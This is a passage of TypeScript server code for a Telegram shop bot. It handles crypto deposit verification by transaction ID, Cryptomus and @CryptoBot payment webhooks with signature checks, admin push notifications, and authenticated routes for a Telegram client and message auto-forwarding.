              await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
              const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
              setTimeout(() => {
                targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
              }, 15000);
            } else {
              await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_trc20_txid_${payment.id}_${newAttempts}` });
            }
            setTimeout(() => {
              targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
            }, 15000);
          }
        } catch (err: any) {
          await storage.updatePayment(payment.id, { status: 'pending' }).catch(() => {});
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> ${err.message || err}`, { parse_mode: 'HTML' });
          const newAttempts = attempts + 1;
          if (newAttempts >= 3) {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
            const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
            setTimeout(() => {
              targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
            }, 15000);
          } else {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_trc20_txid_${payment.id}_${newAttempts}` });
          }
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
        }
      } else if (tgUser?.lastAction?.startsWith('awaiting_aptos_txid_')) {
        const parts = tgUser.lastAction.split('_');
        const paymentId = parseInt(parts[3]);
        const attempts = parts.length > 4 ? parseInt(parts[4]) : 0;
        const txId = normalizedText?.trim() || "";

        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }

        if (!txId) {
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Please enter a valid Transaction ID (TXID).</b>`, { parse_mode: 'HTML' });
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
          return;
        }

        // Lock payment and transition status to processing
        const payment = await db.transaction(async (tx) => {
          const [p] = await tx.select().from(payments).where(eq(payments.id, paymentId)).for('update');
          if (!p) return null;
          if (p.status !== 'pending') return p;

          const [updated] = await tx.update(payments)
            .set({ status: 'processing', updatedAt: new Date() })
            .where(eq(payments.id, paymentId))
            .returning();
          return updated;
        });

        if (!payment || payment.status !== 'processing') {
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Payment request not found or already processed. Please request a new deposit.</b>`, { parse_mode: 'HTML' });
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
          return;
        }

        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
        if (payment.createdAt && new Date(payment.createdAt) < oneHourAgo) {
          await storage.updatePayment(payment.id, { status: 'expired' });
          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>This payment request has expired. Please create a new one.</b>`, { parse_mode: 'HTML' });
          return;
        }

        const walletAddress = (await storage.getSetting('APTOS_WALLET_ADDRESS'))?.value;
        if (!walletAddress) {
          await storage.updatePayment(payment.id, { status: 'pending' });
          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Aptos wallet is not configured. Please contact support.</b>`, { parse_mode: 'HTML' });
          return;
        }

        try {
          const verificationMode = (await storage.getSetting('APTOS_VERIFICATION_MODE'))?.value || 'binance';
          const checkingMsgText = verificationMode === 'binance' 
            ? `⏳ <b>Verifying your Aptos payment via Binance...</b> Please wait a moment.`
            : `⏳ <b>Verifying your Aptos payment on-chain...</b> Please wait a moment.`;
          const checkingMsg = await targetBot.sendMessage(chatId, checkingMsgText, { parse_mode: 'HTML' });

          const result = verificationMode === 'binance'
            ? await verifyDepositViaBinance(txId, 'APTOS', walletAddress)
            : await verifyAptosTransaction(txId, walletAddress);

          try {
            await targetBot.deleteMessage(chatId, checkingMsg.message_id);
          } catch (e) { }

          if (result.success && result.actualAmount) {
            const txResult = await db.transaction(async (tx) => {
              const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
              let currentUsed: string[] = [];
              if (settingRow?.value) {
                try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
              }
              if (currentUsed.includes(txId.toLowerCase())) {
                return { success: false, error: "duplicate" };
              }

              const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
              if (!u) return { success: false, error: "user_not_found" };

              currentUsed.push(txId.toLowerCase());
              if (settingRow) {
                await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
              } else {
                await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
              }

              const creditAmountCents = Math.round(result.actualAmount * 100);
              await tx.update(telegramUsers).set({
                balance: u.balance + creditAmountCents,
                lastAction: null,
                lastMessageId: null
              }).where(eq(telegramUsers.id, u.id));

              await tx.update(payments).set({
                status: 'completed',
                externalId: txId,
                amount: creditAmountCents,
                updatedAt: new Date()
              }).where(eq(payments.id, payment.id));

              return { success: true, creditAmountCents };
            });

            if (txResult.success) {
              await targetBot.sendMessage(chatId, 
                `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Aptos Payment Verified successfully!</b>\n\n` +
                `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${result.actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                { parse_mode: 'HTML' }
              );

              const userDisplayName = tgUser.firstName || tgUser.username || "User";
              io.emit('admin_notification', {
                type: 'deposit',
                title: 'New Aptos Deposit',
                message: `${userDisplayName} deposited $${result.actualAmount.toFixed(2)} via Aptos`,
                data: {
                  paymentId: payment.id,
                  userId: tgUser.telegramId,
                  amount: result.actualAmount,
                  txId
                }
              });

              sendAdminPushNotification(
                'New Aptos Deposit',
                `${userDisplayName} deposited $${result.actualAmount.toFixed(2)} (TXID: ${txId.substring(0, 10)}...)`
              ).catch(console.error);
            } else {
              await storage.updatePayment(payment.id, { status: 'pending' });
              const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> This Transaction ID (TXID) has already been used.`, { parse_mode: 'HTML' });
              const newAttempts = attempts + 1;
              if (newAttempts >= 3) {
                await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
                const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
                setTimeout(() => {
                  targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
                }, 15000);
              } else {
                await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_aptos_txid_${payment.id}_${newAttempts}` });
              }
              setTimeout(() => {
                targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
              }, 15000);
            }
          } else {
            await storage.updatePayment(payment.id, { status: 'pending' });
            const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> ${result.error || 'Transaction details did not match.'}\n\nPlease check your TXID and try entering it again:`, { parse_mode: 'HTML' });
            const newAttempts = attempts + 1;
            if (newAttempts >= 3) {
              await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
              const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
              setTimeout(() => {
                targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
              }, 15000);
            } else {
              await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_aptos_txid_${payment.id}_${newAttempts}` });
            }
            setTimeout(() => {
              targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
            }, 15000);
          }
        } catch (err: any) {
          await storage.updatePayment(payment.id, { status: 'pending' }).catch(() => {});
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> ${err.message || err}`, { parse_mode: 'HTML' });
          const newAttempts = attempts + 1;
          if (newAttempts >= 3) {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
            const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
            setTimeout(() => {
              targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
            }, 15000);
          } else {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_aptos_txid_${payment.id}_${newAttempts}` });
          }
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
        }
      } else if (tgUser?.lastAction?.startsWith('awaiting_screenshot_') && msg.photo) {
      }
    });

};
initBot().catch(err => console.error("Initial bot setup failed:", err));

// Start Backup Scheduler
BackupService.startBackupScheduler().catch(err => console.error("Backup scheduler failed to start:", err));

  // Cryptomus Webhook Handler
  app.post("/api/payments/webhook", async (req, res) => {
    try {
      const apiKey = (await storage.getSetting('CRYPTOMUS_API_KEY'))?.value;
      if (!apiKey) {
        console.error("[Cryptomus Webhook] API Key not configured.");
        return res.status(500).json({ message: "Cryptomus API Key not configured" });
      }

      const { sign, ...data } = req.body;
      if (!sign) {
        console.warn("[Cryptomus Webhook] Missing sign parameter.");
        return res.status(400).json({ message: "Missing sign parameter" });
      }

      const serialized = JSON.stringify(data);
      const computedSign = crypto
        .createHash('md5')
        .update(Buffer.from(serialized).toString('base64') + apiKey)
        .digest('hex');

      if (computedSign !== sign) {
        console.warn("[Cryptomus Webhook] Signature verification failed.", { computedSign, sign });
        return res.status(400).json({ message: "Invalid signature" });
      }

      const { uuid, status } = data;
      if (!uuid) {
        return res.status(400).json({ message: "Missing uuid" });
      }

      console.log(`[Cryptomus Webhook] Received notification for UUID: ${uuid}, Status: ${status}`);

      if (status === 'paid' || status === 'paid_over') {
        const result = await db.transaction(async (tx) => {
          const [payment] = await tx.select().from(payments).where(eq(payments.cryptomusUuid, uuid)).for('update');
          if (!payment) {
            return { success: false, error: "Payment not found" };
          }

          if (payment.status === 'completed') {
            return { success: true, alreadyCompleted: true };
          }

          if (payment.status !== 'pending' && payment.status !== 'processing') {
            return { success: false, error: `Invalid payment status: ${payment.status}` };
          }

          await tx.update(payments).set({ status: 'processing', updatedAt: new Date() }).where(eq(payments.id, payment.id));

          const [user] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, payment.telegramUserId)).for('update');
          if (!user) {
            return { success: false, error: "User not found" };
          }

          await tx.update(telegramUsers).set({
            balance: user.balance + payment.amount
          }).where(eq(telegramUsers.id, user.id));

          await tx.update(payments).set({ status: 'completed', updatedAt: new Date() }).where(eq(payments.id, payment.id));

          return { success: true, payment, user };
        });

        if (!result.success) {
          console.error("[Cryptomus Webhook] Processing failed:", result.error);
          return res.status(400).json({ message: result.error });
        }

        if (result.alreadyCompleted) {
          return res.json({ success: true, message: "Already completed" });
        }

        const payment = result.payment!;
        const user = result.user!;
        const chatId = user.telegramId;

        const activeBot = bot || (await getBotToken() ? new TelegramBot((await getBotToken())!) : null);
        if (activeBot) {
          try {
            await activeBot.sendMessage(chatId, `✅ Cryptomus payment verified! $${(payment.amount / 100).toFixed(2)} has been added to your balance.`);
          } catch (botErr) {
            console.error("[Cryptomus Webhook] Failed to send Telegram message to user:", botErr);
          }
        }

        const userDisplayName = user.firstName || user.username || "User";
        io.emit('admin_notification', {
          type: 'deposit',
          title: 'New Cryptomus Deposit',
          message: `${userDisplayName} deposited $${(payment.amount / 100).toFixed(2)} via Cryptomus`,
          data: {
            paymentId: payment.id,
            userId: user.telegramId,
            amount: payment.amount / 100,
            txId: uuid
          }
        });

        sendAdminPushNotification(
          'New Cryptomus Deposit',
          `${userDisplayName} deposited $${(payment.amount / 100).toFixed(2)}`
        ).catch(console.error);
      }

      return res.json({ success: true });
    } catch (error: any) {
      console.error("[Cryptomus Webhook] Unexpected error:", error);
      return res.status(500).json({ message: error.message || error });
    }
  });

  // @CryptoBot Webhook Handler
  app.post("/api/payments/cryptobot/webhook", express.json(), async (req, res) => {
    try {
      const tokenSetting = await storage.getSetting('CRYPTO_BOT_API_TOKEN');
      const apiToken = tokenSetting?.value || process.env.CRYPTO_BOT_API_TOKEN;

      if (!apiToken) {
        console.error("[CryptoBot Webhook] API Token not configured.");
        return res.status(500).json({ message: "CryptoBot API Token not configured" });
      }

      const signature = req.headers['crypto-pay-api-signature'] as string;
      if (!signature) {
        console.warn("[CryptoBot Webhook] Missing signature header.");
        return res.status(400).json({ message: "Missing signature header" });
      }

      const rawBody = (req as any).rawBody
        ? ((req as any).rawBody as Buffer).toString('utf-8')
        : (typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
      const secret = crypto.createHash('sha256').update(apiToken).digest();
      const checkSignature = crypto.createHmac('sha256', secret).update(rawBody).digest('hex');

      if (checkSignature !== signature) {
        console.warn("[CryptoBot Webhook] Signature verification failed.");
        return res.status(400).json({ message: "Invalid signature" });
      }

      const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

      if (body.update_type === 'invoice_paid') {
        const invoice = body.payload;
        const paymentId = parseInt(invoice.payload, 10);
        const uuid = invoice.invoice_id ? invoice.invoice_id.toString() : '';

        if (!isNaN(paymentId)) {
          // ATOMIC UPDATE: Only update if status is currently 'pending' to prevent DOUBLE CREDITING
          const [updatedPayment] = await db.update(payments)
            .set({ status: 'completed', externalId: uuid, updatedAt: new Date() })
            .where(and(eq(payments.id, paymentId), eq(payments.status, 'pending')))
            .returning();

          if (updatedPayment) {
            await db.execute(sql`UPDATE telegram_users SET balance = balance + ${updatedPayment.amount} WHERE id = ${updatedPayment.telegramUserId}`);

            const [user] = await db.select().from(telegramUsers).where(eq(telegramUsers.id, updatedPayment.telegramUserId));

            const activeBot = await getBroadcastBot();
            if (activeBot && user) {
              await activeBot.sendMessage(
                user.telegramId,
                `✅ <b>@CryptoBot Payment Verified!</b>\n\n` +
                `💰 Credited: <b>$${(updatedPayment.amount / 100).toFixed(2)}</b> has been added to your balance.\n` +
                `Thank you! 🤍`,
                { parse_mode: 'HTML' }
              ).catch((err: any) => console.error("Failed to notify user:", err));
            }

            if (user) {
              const userDisplayName = user.firstName || user.username || "User";
              io.emit('admin_notification', {
                type: 'deposit',
                title: 'New @CryptoBot Deposit',
                message: `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)} via @CryptoBot`,
                data: { paymentId: updatedPayment.id, userId: user.telegramId, amount: updatedPayment.amount / 100, txId: uuid }
              });

              sendAdminPushNotification(
                'New @CryptoBot Deposit',
                `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)}`
              ).catch(console.error);
            }
          }
        }
      }

      return res.json({ ok: true });
    } catch (error: any) {
      console.error("[CryptoBot Webhook] Error:", error);
      return res.status(500).json({ message: error.message || error });
    }
  });

  // Push Notification Routes
  app.get("/api/admin/push-key", isAuth, async (req, res) => {
    const { publicKey } = await initPushNotifications();
    res.json({ publicKey });
  });

  app.post("/api/admin/subscribe", isAuth, async (req, res) => {
    const { subscription } = req.body;
    console.log('[PUSH] Received subscription request from user:', req.session.userId);
    if (!subscription) {
      console.error('[PUSH] No subscription object provided');
      return res.status(400).json({ message: "Subscription required" });
    }
    await storage.savePushSubscription(req.session.userId!, subscription);
    console.log('[PUSH] Subscription saved successfully for user:', req.session.userId);
    res.sendStatus(201);
  });

  app.post("/api/admin/test-push", isAuth, async (req, res) => {
    console.log('[PUSH] Manual test trigger by user:', req.session.userId);
    await sendAdminPushNotification(
      'Test Alert',
      'This is a test notification from Shopeefy!',
      '/settings'
    );
    res.json({ success: true });
  });

  // --- Telegram Client (MTProto) API Routes ---
  app.get("/api/telegram-client/status", isAuth, async (req, res) => {
    try {
      res.json({ connected: isClientConnected() });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/telegram-client/send-code", isAuth, async (req, res) => {
    const { apiId, apiHash, phoneNumber } = req.body;
    if (!apiId || !apiHash || !phoneNumber) {
      return res.status(400).json({ message: "apiId, apiHash, and phoneNumber are required." });
    }
    try {
      await sendOtpCode(Number(apiId), apiHash, phoneNumber);
      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/telegram-client/login", isAuth, async (req, res) => {
    const { code, password } = req.body;
    if (!code) {
      return res.status(400).json({ message: "Verification code is required." });
    }
    try {
      const result = await signInClient(code, password);
      res.json(result);
    } catch (err: any) {
      res.status(400).json({ message: err.message });
    }
  });

  app.post("/api/telegram-client/logout", isAuth, async (req, res) => {
    try {
      const result = await logoutClient();
      res.json(result);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/telegram-client/chats", isAuth, async (req, res) => {
    try {
      const chats = await getChats();
      res.json(chats);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/telegram-client/peer-details/:peerId", isAuth, async (req, res) => {
    const { peerId } = req.params;
    try {
      const details = await getPeerDetails(peerId);
      res.json(details);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/telegram-client/profile-photo/:peerId", isAuth, async (req, res) => {
    const { peerId } = req.params;
    try {
      const client = getTelegramClient();
      if (!client || !client.connected) {
        return res.status(400).json({ message: "Telegram client not connected" });
      }

      // Check cache first
      const cacheDir = path.join(process.cwd(), 'public', 'uploads', 'profile_photos');
      const cacheFilePath = path.join(cacheDir, `${peerId}.jpg`);

      if (fs.existsSync(cacheFilePath)) {
        return res.sendFile(cacheFilePath);
      }

      // Download from Telegram if not cached
      let peer;
      try {
        peer = await client.getInputEntity(peerId);
      } catch (err) {
        peer = peerId;
      }

      const entity = await client.getEntity(peer);
      const buffer = await client.downloadProfilePhoto(entity);
      if (!buffer || buffer.length === 0) {
        return res.status(404).send("No profile photo");
      }

      // Save to cache directory
      if (!fs.existsSync(cacheDir)) {
        fs.mkdirSync(cacheDir, { recursive: true });
      }
      fs.writeFileSync(cacheFilePath, buffer);

      res.setHeader("Content-Type", "image/jpeg");
      res.setHeader("Cache-Control", "public, max-age=86400"); // Cache for 1 day
      return res.send(buffer);
    } catch (err: any) {
      console.error("[Profile Photo Error]", err);
      return res.status(500).send("Failed to load photo");
    }
  });

  app.get("/api/telegram-client/message-media/:chatId/:messageId", isAuth, async (req, res) => {
    const { chatId, messageId } = req.params;
    try {
      // Check cache first
      const cacheDir = path.join(process.cwd(), 'public', 'uploads', 'message_media');
      const cacheFilePath = path.join(cacheDir, `${chatId}_${messageId}.jpg`);

      if (fs.existsSync(cacheFilePath)) {
        return res.sendFile(cacheFilePath);
      }

      const buffer = await downloadMessageMedia(chatId, Number(messageId));
      if (!buffer || buffer.length === 0) {
        return res.status(404).send("Failed to download media");
      }

      // Save to cache directory
      if (!fs.existsSync(cacheDir)) {
        fs.mkdirSync(cacheDir, { recursive: true });
      }
      fs.writeFileSync(cacheFilePath, buffer);

      res.setHeader("Content-Type", "image/jpeg");
      res.setHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
      return res.send(buffer);
    } catch (err: any) {
      console.error("[Message Media Error]", err);
      return res.status(500).send("Failed to load message media");
    }
  });

  app.get("/api/telegram-client/messages/:peer", isAuth, async (req, res) => {
    const { peer } = req.params;
    const limit = req.query.limit ? Number(req.query.limit) : 50;
    try {
      const messages = await getChatMessages(peer, limit);
      res.json(messages);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/telegram-client/send-message", isAuth, async (req, res) => {
    const { chatId, text } = req.body;
    if (!chatId || !text) {
      return res.status(400).json({ message: "chatId and text are required." });
    }
    try {
      const message = await sendChatMessage(chatId, text);
      res.json(message);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  // --- Telegram Auto-Forward API Routes ---
  app.get("/api/forward/config", isAuth, async (req, res) => {
    try {
      const config = await getForwardConfig();
      res.json(config);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/forward/config", isAuth, async (req, res) => {
    try {
      const updated = await updateForwardConfig(req.body);
      res.json(updated);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/api/forward/groups", isAuth, async (req, res) => {
    try {
      const groups = await getDetectedGroups();
      res.json(groups);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/forward/sync-groups", isAuth, async (req, res) => {
    try {
      const result = await syncGroupsManually();
      res.json(result);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/forward/groups/clear", isAuth, async (req, res) => {
    try {
      const cleared = await clearForwardCounters();
      res.json({ success: true, groups: cleared });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/forward/groups/:groupId/toggle", isAuth, async (req, res) => {
    const { groupId } = req.params;
    try {
      const groups = await getDetectedGroups();
      const group = groups.find(g => g.groupId === groupId);
      if (!group) {
        return res.status(404).json({ message: "Group not found." });
      }
      group.disabled = !group.disabled;
      await saveDetectedGroups(groups);
      res.json({ success: true, groups });
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/forward/test", isAuth, async (req, res) => {
    try {
      const result = await testForwardMessage();
      res.json(result);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  return httpServer;
}
